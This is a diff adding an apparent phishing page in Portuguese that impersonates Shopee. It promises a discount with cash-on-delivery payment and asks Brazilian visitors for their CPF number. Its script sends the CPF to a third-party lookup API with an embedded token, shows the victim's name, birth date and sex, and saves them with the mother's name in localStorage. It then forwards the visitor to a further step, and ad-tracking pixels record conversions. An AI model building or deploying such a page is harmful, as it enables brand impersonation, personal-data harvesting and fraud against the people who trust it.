@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta http-equiv="content-type" content="text/html;charset=UTF-8">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Consulta de CPF</title>
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&amp;display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-color: #f9f9f9;
+            color: #333;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        .header {
+            background-color: #ffffff;
+            padding: 20px;
+            text-align: center;
+            border-bottom: 3px solid #ee4d2d;
+        }
+        .header img {
+            width: 150px;
+        }
+        .main-content {
+            max-width: 500px;
+            background: #fff;
+            margin: 50px auto;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        }
+        .btn-custom {
+            color: white;
+            border: none;
+            width: 100%;
+            margin-bottom: 10px;
+            background: #ee4d2d;
+            font-weight: 600;
+            border-radius: 1rem;
+            padding: .75rem 3rem;
+            letter-spacing: .3px;
+            line-height: 1.15;
+        }
+        .btn-custom:hover {
+            color: white !important;
+            background-color: #000 !important;
+            transform: scale(1.02) !important;
+        }
+        .footer {
+            background: #ffffff;
+            border-top: 1px solid #e6e6e6;
+            text-align: center;
+            padding: 15px;
+            font-size: 10px;
+            color: #666;
+            margin-top: auto;
+        }
+        .result-box {
+            margin-top: 20px;
+            background-color: #f9f9f9;
+            border: 1px solid #e6e6e6;
+            border-radius: 8px;
+            padding: 15px;
+            display: none;
+            text-align: left;
+        }
+        .result-box p {
+            margin: 0 0 10px;
+        }
+        .loader {
+            display: none;
+            text-align: center;
+            margin-bottom: 15px;
+        }
+        .loader img {
+            width: 50px;
+            height: 50px;
+        }
+        .success-message {
+            text-align: center;
+            font-weight: bold;
+            color: green;
+            margin-bottom: 15px;
+        }
+        .success-message img {
+            width: 50px;
+            height: 50px;
+            display: block;
+            margin: 0 auto 10px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <div class="header">
+        <img src="images/shopee-logo.png" alt="YES Card">
+    </div>
+
+    <!-- Main Content -->
+    <div class="main-content">
+        <p style="color:gray; text-align:initial">Preencha o CPF para garantir o desconto</p>
+        <form id="cadastroForm" style="text-align:initial">
+            <div class="mb-3">
+                <label for="cpf" class="form-label" style="color:gray; font-size:13px">CPF</label>
+                <input type="text" class="form-control" id="cpf" placeholder="000.000.000-00">
+            </div>
+        </form>
+        <button id="consultarBtn" class="btn-custom" onclick="submitLog()">Consultar CPF</button>
+
+        <div id="loader" class="loader">
+            <img src="images/21-18-05-265_512.gif" alt="Carregando...">
+            <p>Consultando seus dados e desconto...</p>
+        </div>
+
+        <!-- Resultado -->
+        <div id="resultBox" class="result-box">
+            <div class="success-message">
+                <img src="images/6784655.png" alt="Aprovado">
+                <p>Desconto + Pagamento na entrega aplicado com sucesso para seu perfil:</p>
+            </div>
+            <p><strong>Nome:</strong> <span id="nomeCompleto"></span></p>
+            <p><strong>CPF:</strong> <span id="cpfMostrar"></span></p>
+            <p><strong>Data de Nascimento:</strong> <span id="dataNascimento"></span></p>
+            <p><strong>Sexo:</strong> <span id="sexo"></span></p>
+            <button class="btn-custom" onclick="continuar()">Continuar</button>
+        </div>
+    </div>
+
+    <!-- Script -->
+    <script>
+        async function getCPF(strCPF) {
+            const url = "https://api.amnesiatecnologia.lat/?token=4c80cd47-d9d5-4672-a301-b9b8741fc293&cpf=" + strCPF;
+            const res = await fetch(url);
+            return await res.json();
+        }
+
+        function validaCPF(strCPF) {
+            let Soma = 0;
+            let Resto;
+            if (strCPF == "00000000000") return false;
+            for (let i = 1; i <= 9; i++) Soma += parseInt(strCPF.substring(i - 1, i)) * (11 - i);
+            Resto = (Soma * 10) % 11;
+            if ((Resto == 10) || (Resto == 11)) Resto = 0;
+            if (Resto != parseInt(strCPF.substring(9, 10))) return false;
+            Soma = 0;
+            for (let i = 1; i <= 10; i++) Soma += parseInt(strCPF.substring(i - 1, i)) * (12 - i);
+            Resto = (Soma * 10) % 11;
+            if ((Resto == 10) || (Resto == 11)) Resto = 0;
+            if (Resto != parseInt(strCPF.substring(10, 11))) return false;
+            return true;
+        }
+
+        async function submitLog() {
+            const cpf = document.getElementById("cpf").value.replace(/-/g, "").replace(/\./g, "");
+            const loader = document.getElementById("loader");
+            const resultBox = document.getElementById("resultBox");
+            const consultarBtn = document.getElementById("consultarBtn");
+
+            if (!validaCPF(cpf)) {
+                alert("CPF inválido!");
+                return;
+            }
+
+            loader.style.display = "block";
+            consultarBtn.style.display = "none";
+            resultBox.style.display = "none";
+
+            try {
+                const responseCPF = await getCPF(cpf);
+                console.log("Resposta da API:", responseCPF); // Para debug
+
+                // CORREÇÃO AQUI: Acessando os dados corretamente
+                const dados = responseCPF.DADOS || responseCPF.dados || {};
+
+                const nomeCompleto = dados.nome || dados.NOME || "Não encontrado";
+                const nomeMae = dados.nome_mae || dados.NOME_MAE || "Não encontrado";
+                const dataNascimento = dados.data_nascimento || dados.DATA_NASCIMENTO || "Não encontrado";
+                const sexo = dados.sexo || dados.SEXO || "Não encontrado";
+
+                // Formatar CPF para exibição
+                const cpfFormatado = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
+
+                document.getElementById("nomeCompleto").innerText = nomeCompleto;
+                document.getElementById("cpfMostrar").innerText = cpfFormatado;
+                document.getElementById("dataNascimento").innerText = dataNascimento;
+                document.getElementById("sexo").innerText = sexo === "I" ? "Indefinido" : (sexo === "M" ? "Masculino" : "Feminino");
+
+                // Salvar os dados no localStorage
+                localStorage.setItem("dadosCPF", JSON.stringify({
+                    nomeCompleto,
+                    nomeMae,
+                    dataNascimento,
+                    sexo,
+                    cpf: cpfFormatado
+                }));
+
+                loader.style.display = "none";
+                resultBox.style.display = "block";
+
+            } catch (error) {
+                console.error("Erro na consulta:", error);
+                alert("Erro ao consultar o CPF. Tente novamente.");
+                loader.style.display = "none";
+                consultarBtn.style.display = "block";
+            }
+        }
+
+        function continuar() {
+            window.location.href = '/5/index.html' + window.location.search;
+        }
+
+        // Máscara para o campo CPF
+        document.getElementById("cpf").addEventListener("input", function(e) {
+            let value = e.target.value.replace(/\D/g, "");
+            if (value.length > 11) value = value.slice(0, 11);
+            value = value.replace(/(\d{3})(\d)/, "$1.$2");
+            value = value.replace(/(\d{3})(\d)/, "$1.$2");
+            value = value.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
+            e.target.value = value;
+        });
+    </script>
+
+    <!-- Footer -->
+    <div class="footer">
+        Copyright © 2025 Shopee. Todos os direitos reservados.<br>
+        Política de Privacidade | Termos de Uso Vendas e Reembolsos | Legal Mapa do Site
+    </div>
+
+    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-subids async defer></script>
+    <script>
+        window.pixelId = "67a2ccee407daa3589707502";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+
+    <!-- Meta Pixel Code -->
+    <script>
+        ! function(f, b, e, v, n, t, s) {
+            if (f.fbq) return;
+            n = f.fbq = function() {
+                n.callMethod ?
+                    n.callMethod.apply(n, arguments) : n.queue.push(arguments)
+            };
+            if (!f._fbq) f._fbq = n;
+            n.push = n;
+            n.loaded = !0;
+            n.version = '2.0';
+            n.queue = [];
+            t = b.createElement(e);
+            t.async = !0;
+            t.src = v;
+            s = b.getElementsByTagName(e)[0];
+            s.parentNode.insertBefore(t, s)
+        }(window, document, 'script',
+            'https://connect.facebook.net/en_US/fbevents.js');
+        fbq('init', '2423207534854704');
+        fbq('track', 'PageView');
+    </script>
+    <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=2423207534854704&ev=PageView&noscript=1" /></noscript>
+    <!-- End Meta Pixel Code -->
+</body>
+</html>
